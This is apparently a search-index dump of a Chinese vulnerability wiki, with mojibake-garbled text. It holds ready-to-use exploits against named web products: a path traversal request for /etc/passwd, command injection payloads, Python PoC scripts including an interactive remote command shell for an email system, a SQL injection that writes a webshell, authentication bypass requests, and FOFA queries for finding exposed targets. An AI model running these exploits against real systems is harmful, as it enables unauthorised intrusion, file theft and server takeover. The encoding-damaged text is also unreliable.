‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊòüÈîêËìùÊµ∑/ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü download.php ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü download.php ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü download.php ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü download.phpÊñá‰ª∂Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøá ../ ÈÅçÂéÜÁõÆÂΩïÂèØ‰ª•ËØªÂèñÊúçÂä°Âô®‰∏äÁöÑÊïèÊÑüÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title==\"ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ download.php ÔºåÂÖ∂‰∏≠ fileÂèÇÊï∞ Â≠òÂú®Áî®Êà∑ÂèØÊéß ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖ GET /download.php?file=../../../../../etc/passwd HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=qkoqsiilc4dol8s4e9d7ta15g7; mylang=zh_s Connection: close Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊòüÈîêËìùÊµ∑/ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊòüÈîêËìùÊµ∑/ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü debug.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü debug.php Â≠òÂú®ÂëΩ‰ª§Ë∞ÉËØïÈ°µÈù¢ÔºåÂØºËá¥ÊîªÂáªËÄÖÂèØ‰ª•ËøúÁ®ãÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title==\"ËìùÊµ∑ÂçìË∂äËÆ°Ë¥πÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥û‰ª£Á†Å ËÆøÈóÆ debug.phpÈ°µÈù¢ ËøúÁ®ãË∞ÉËØïÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÁæéÊï∞Â≠ó/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÁæéÊï∞Â≠ó/","title":"ÂÆâÁæéÊï∞Â≠ó","keywords":"","body":"ÂÆâÁæéÊï∞Â≠ó ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü server_ping.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÁæéÊï∞Â≠ó/ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü server_ping.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÁæéÊï∞Â≠ó/ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü server_ping.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü server_ping.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü server_ping.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü server_ping.php Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊºèÊ¥ûÊñá‰ª∂‰∏≠ipÂèÇÊï∞Êú™ËøáÊª§ÈÄ†ÊàêÂëΩ‰ª§ÊâßË°å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü FOFA [!NOTE] \"ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ server_ping.php \\n\"; echo \"parent.doTestResult('$id', 'ok');\\n\"; echo \"\\n\"; } else { echo \"\\n\"; echo \"parent.doTestResult('$id', 'no');\\n\"; echo \"\\n\"; } ?> ÊºèÊ¥û‰ΩçÁΩÆ‰∏∫ $cmd = \"ping -c 2 -s 65 $ip\"; $fp = popen($cmd, \"r\"); GET‰º†ÂÖ• $ipÂèÇÊï∞ ÂêéÁõ¥Êé•ÂëΩ‰ª§ÊâßË°åÔºåÂπ∂‰∏îÊñá‰ª∂Êó†ÊùÉÈôêË¶ÅÊ±Ç ËØ∑Ê±ÇÂåÖ‰∏∫ GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: ÂÆâÁæéÊï∞Â≠ó ÈÖíÂ∫óÂÆΩÂ∏¶ËøêËê•Á≥ªÁªü server_ping.php ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°å cat /etc/passwd>../../test.txt \\033[0m\".format(target_url)) if \"parent\" in response.text and response.status_code == 200: vuln_url = target_url + \"/test.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) if \"root:\" in response.text: print(\"\\033[36m[o] ÊàêÂäüÊâßË°å cat /etc/passwd, ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\") else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Êìé/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Êìé/","title":"Â§©Êìé","keywords":"","body":"Â§©Êìé Â§©Êìé Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û Â§©Êìé ÂâçÂè∞SQLÊ≥®ÂÖ• Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Êìé/Â§©Êìé Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Êìé/Â§©Êìé Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"Â§©Êìé Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"Â§©Êìé Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Â§©Êìé Â≠òÂú®Êú™ÊéàÊùÉË∂äÊùÉËÆøÈóÆÔºåÈÄ†ÊàêÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Â§©Êìé ÊºèÊ¥ûÂ§çÁé∞ GET /api/dbstat/gettablessize HTTP/1.1 Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ 360_Tianqing_database_information_disclosure Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Êìé/Â§©Êìé ÂâçÂè∞SQLÊ≥®ÂÖ•.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Â§©Êìé/Â§©Êìé ÂâçÂè∞SQLÊ≥®ÂÖ•.html","title":"Â§©Êìé ÂâçÂè∞SQLÊ≥®ÂÖ•","keywords":"","body":"Â§©Êìé ÂâçÂè∞SQLÊ≥®ÂÖ• ÊºèÊ¥ûÊèèËø∞ Â§©Êìé Â≠òÂú®SQLÊ≥®ÂÖ•,ÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÊºèÊ¥û‰∏ä‰º†Êú®È©¨ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Â§©Êìé FOFA [!NOTE] title=\"360Êñ∞Â§©Êìé\" ÊºèÊ¥ûÂ§çÁé∞ Ê≥®ÂÖ•ÂÜôshell: https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('');copy O(T) to 'C:\\Program Files (x86)\\360\\skylar6\\www\\1.php';drop table O;-- Âà©Áî®ËøáÁ®ã: 1. ÈÄöËøáÂÆâË£ÖÂåÖÂÆâË£ÖÁöÑ‰∏ÄËà¨ÈÉΩÊúârootÊùÉÈôêÔºåÂõ†Ê≠§ËØ•Ê≥®ÂÖ•ÁÇπÂèØÂ∞ùËØïÂÜôshell 2. ÈÄöËøáÊ≥®ÂÖ•ÁÇπÔºåÂàõÂª∫‰∏ÄÂº†Ë°® O 3. ‰∏∫ Ë°®O Ê∑ªÂä†‰∏Ä‰∏™Êñ∞Â≠óÊÆµ T Âπ∂‰∏îÂÜôÂÖ•shellÂÜÖÂÆπ 4. PostgresÊï∞ÊçÆÂ∫ì ‰ΩøÁî®COPY TOÊää‰∏Ä‰∏™Ë°®ÁöÑÊâÄÊúâÂÜÖÂÆπÈÉΩÊã∑Ë¥ùÂà∞‰∏Ä‰∏™Êñá‰ª∂(ÂÆåÊàêÂÜôshell) 5. Âà†Èô§ Ë°®O ‰ΩøÁî®ÂëΩ‰ª§ sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ 360 TianQing ccid SQL injectable Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øÈÇÆ/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øÈÇÆ/","title":"‰∫øÈÇÆ","keywords":"","body":"‰∫øÈÇÆ ‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øÈÇÆ/‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øÈÇÆ/‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü FOFA [!NOTE] body=\"‰∫øÈÇÆÁîµÂ≠êÈÇÆ‰ª∂Á≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 39 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 type='|cat /etc/passwd||' ÊºèÊ¥ûPOC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Eyou Email SYSTEM \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|cat /etc/passwd||'\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] Ê≠£Âú®ËØ∑Ê±Ç {}//webadm/?q=moni_detail.do&action=gragh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {}Â≠òÂú®ÊºèÊ¥û ,ÊàêÂäüÊâßË°å cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|{}||'\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] Eyou Mail system RCE Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÂ§©/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÂ§©/","title":"ÂÆâÂ§©","keywords":"","body":"ÂÆâÂ§© ÂÆâÂ§© È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÂ§©/ÂÆâÂ§© È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÂÆâÂ§©/ÂÆâÂ§© È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û.html","title":"ÂÆâÂ§© È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û","keywords":"","body":"ÂÆâÂ§© È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü Ë∂äÊùÉËÆøÈóÆÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÂÆâÂ§© È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü Â≠òÂú®Ë∂äÊùÉËÆøÈóÆÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÂ∑•ÂÖ∑‰øÆÊîπÁâπÂÆöÁöÑËøîÂõûÂåÖÂØºËá¥Ë∂äÊùÉÂêéÂè∞Êü•ÁúãÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÂÆâÂ§© È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü FOFA [!NOTE] title=\"È´òÁ∫ßÂèØÊåÅÁª≠Â®ÅËÉÅÂÆâÂÖ®Ê£ÄÊµãÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂÖ∂‰∏≠ÊäìÂåÖËøáÁ®ã‰∏≠ÂèëÁé∞ËØ∑Ê±ÇÁöÑ‰∏Ä‰∏™Ë∫´‰ªΩÈ™åËØÅ Url {\"role\": \"\", \"login_status\": false, \"result\": \"ok\"} ÂÖ∂‰∏≠ login_status ‰∏∫ false, Â∞ÜÂèÇÊï∞‰ΩøÁî® Burp ÊõøÊç¢ÂìçÂ∫îÂåÖ‰∏∫ true ËØ∑Ê±Ç /api/user/islogin Êó∂ÊàêÂäüË∂äËøáË∫´‰ªΩÈ™åËØÅ ÂÜçÊ¨°ËÆøÈóÆÈ¶ñÈ°µÈ™åËØÅË∂äÊùÉÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊÄùÁ¶èËø™Â†°ÂûíÊú∫/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊÄùÁ¶èËø™Â†°ÂûíÊú∫/","title":"ÊÄùÁ¶èËø™Â†°ÂûíÊú∫","keywords":"","body":"ÊÄùÁ¶èËø™Â†°ÂûíÊú∫ ÊÄùÁ¶èËø™Â†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊÄùÁ¶èËø™Â†°ÂûíÊú∫/ÊÄùÁ¶èËø™Â†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊÄùÁ¶èËø™Â†°ÂûíÊú∫/ÊÄùÁ¶èËø™Â†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û.html","title":"ÊÄùÁ¶èËø™Â†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û","keywords":"","body":"ÊÄùÁ¶èËø™Â†°ÂûíÊú∫ ‰ªªÊÑè‚Ω§Êà∑ÁôªÂΩïÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÊÄùÁ¶èËø™Â†°ÂûíÊú∫Â≠òÂú®‰ªªÊÑè‚Ω§Êà∑ÁôªÂΩïÊºèÊ¥ûÔºåÊÅ∂ÊÑèÊîªÂáªËÄÖÂèØ‰ª•ÁªïËøáÂ†°ÂûíÊú∫ÁöÑÂØÜÁ†ÅÁôªÂΩïÈ™åËØÅÊú∫Âà∂Ôºå‰ª•‰ªª ÊÑè‚Ω§Êà∑Ë∫´‰ªΩÈöèÊÑèÁôªÂΩïÂ†°ÂûíÊú∫WebÁÆ°ÁêÜÁïå‚æØÔºåÂπ∂ÂèØ‰ª•Ê≠£Â∏∏ÁöÑ‰Ωø‚Ω§Ë¥¶Êà∑ÊùÉÈôêÂéªÊìç‰Ωú„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÊÄùÁ¶èËø™Â†°ÂûíÊú∫ FOFA [!NOTE] \"LogbaseËøêÁª¥ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ Ëé∑ÂèñINFOÂ≠óÊÆµÔºåu1ÂèÇÊï∞ÂÄº‰∏∫‚Ω§Êà∑Âêç POST /bhost/set_session HTTP/1.1 Host: xxx.xxx.xxx.xx u1=admin&m1= Ëé∑ÂæóÔºö{\"result\":true,\"info\":\"1562205376847\",\"ErrMsg\":\"\"} Â∏¶‚ºäINFOÂ≠óÊÆµËøõ‚ºäÂ¶Ç‰∏ãËØ∑Ê±ÇÁöÑ a0 ÂèÇÊï∞ÂÄº‰∏≠,uCodeÂèÇÊï∞ÂÄº‰∏∫‚Ω§Êà∑Âêç POST /bhost/login_link HTTP/1.1 Host: xxx.xxx.xxx.xxx a0=1562205376847&a1=&a10=2019-01- 01+10:10:10&ha=CADFDF26E649FB6284D2FD424BD294B6&uCode=admin&vdcode= Âà©Áî®ÂêéÂç≥ÂèØÁôªÂΩïÂêéÂè∞ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈΩêÊ≤ªÂ†°ÂûíÊú∫/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÈΩêÊ≤ªÂ†°ÂûíÊú∫/","title":"ÈΩêÊ≤ªÂ†°ÂûíÊú∫","keywords":"","body":"ÈΩêÊ≤ªÂ†°ÂûíÊú∫ ÈΩêÊ≤ªÂ†°ÂûíÊú∫ ‰ªªÊÑèÁî®Êà∑ÁôªÂΩïÊºèÊ¥û 